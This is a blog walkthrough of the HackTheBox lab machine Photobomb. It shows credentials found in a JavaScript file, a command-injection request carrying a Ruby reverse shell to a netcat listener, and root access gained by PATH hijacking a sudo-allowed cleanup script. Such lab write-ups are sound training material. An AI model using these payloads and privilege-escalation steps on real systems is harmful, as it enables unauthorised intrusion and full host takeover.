---
title: "HackTheBox Photobomb"
date: 2022-12-29T22:11:10+01:00
draft: false
---

Today we're exploiting Photobomb one the easiest machine on HackTheBox.
We'll perform a command injection to gain a reverse shell on the box and
exploit a script using path variables.
<!--more-->

## **Nmap**

```
# Nmap 7.93 scan initiated Thu Dec 29 11:35:05 2022 as: nmap -sC -sV -o nmap.txt 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 29 11:35:13 2022 -- 1 IP address (1 host up) scanned in 7.63 seconds
```
As usual two ports are open `ssh:22` and `http:80`. (Don't forget to add photobomb.htb to your hosts file).

## **HTTP:80**

![image text](/web_page_photobomb.png)

On the web page there is a link which redirect us to /printer directory and 
asking for username and password but there is also a message : (the credentials are in your welcome pack). Looking in the dev tools there is a js file which contains the credentials : 

```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:******@photobomb.htb/printer');
  }
}
window.onload = init;
```

After I successfully logged in we have a page where we can download pictures.
I cliked on the download button and captured the request with burpsuite : 


![image text](/burp_photobomb.png)

## **Shell as wizard**

To be honest I struggled to find a way to exploit this but it was so simple.
By checking all parameters, the filetype parameters was vulnerable to command injection so I generated a ruby reverse shell (I choose ruby because the site was running sinatra) and inject it : 

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ruby+-rsocket+-e'spawn("sh",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new("IP",PORT))'&dimensions=3000x2000
```
Start a listenner using netcat and here we go : 

```
rlwrap nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.171] from (UNKNOWN) [10.10.11.182] 50958
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
```
Now just grab the user flag in wizard home's directory.

## **Shell as root**

For the root part no need to run linpeas just do sudo -l to see what
we can run as root : 

```
wizard@photobomb:~$ sudsudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
Okay so basically we can run cleanup.sh script as root with SETENV.

the cleanup script : 

```
wizard@photobomb:~$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
To resume it does some cleaning stuff but if you noticed at the end 
it calls find binary but without specifie the full path so can abuse this
by creating a file named find put some stuff in it and modify our PATH varibale then we the script will call find it will use our malicious file. Easy right ?

Our malicious file contains only two lines :
```
wizard@photobomb:/tmp$ cat find
cat find
#!/bin/bash

/bin/bash
```
Now just by running the command as follow : 

```
wizard@photobomb:/tmp$ sudo PATH=/tmp/ /opt/cleanup.sh
```
I set the path to /tmp because it is where my malicious file is located and we are root :

```
wizard@photobomb:/tmp$ sudo PATH=/tmp/ /opt/cleanup.sh
sudo PATH=/tmp/ /opt/cleanup.sh
/opt/.bashrc: line 13: [: command not found
/opt/.bashrc: line 20: [: command not found
/opt/.bashrc: line 26: [: command not found
/opt/.bashrc: line 50: [: command not found
/opt/.bashrc: line 63: [: command not found
/opt/cleanup.sh: line 6: [: command not found
bash: groups: command not found
Command 'lesspipe' is available in the following places
 * /bin/lesspipe
 * /usr/bin/lesspipe
The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
lesspipe: command not found
Command 'dircolors' is available in the following places
 * /bin/dircolors
 * /usr/bin/dircolors
The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
dircolors: command not found
root@photobomb:/home/wizard/photobomb#
```

And voila short writeup, photobomb was a fun box unless it's not really real life applicable.
Big stuff are coming for 2023 (some pro labs :) ) 
Happy New Year !!!